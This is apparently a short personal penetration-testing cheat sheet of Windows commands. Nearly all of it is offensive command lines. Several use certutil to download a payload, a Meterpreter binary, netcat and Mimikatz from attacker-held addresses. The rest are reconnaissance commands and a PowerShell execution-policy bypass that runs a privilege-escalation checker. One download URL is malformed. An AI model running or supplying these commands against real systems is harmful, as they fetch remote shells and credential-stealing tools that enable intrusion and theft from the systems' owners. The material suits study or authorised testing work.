---
dg-publish: true
---
# Windows Commands

```bash
systeminfo
certutil -urlcache -f http://10.10.12.2/payload.exe payload.exe
certutil -urlcache -f http://(IPaddress)/meterpreter.exe meterpreter.exe
certutil -urlcache -f http://10.10.3.3/nc.exe nc.exe
certutil -urlcache -f http://mimikatz.exe mimikatz.exe
ipconfig
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
meterpreter > ipconfig
```
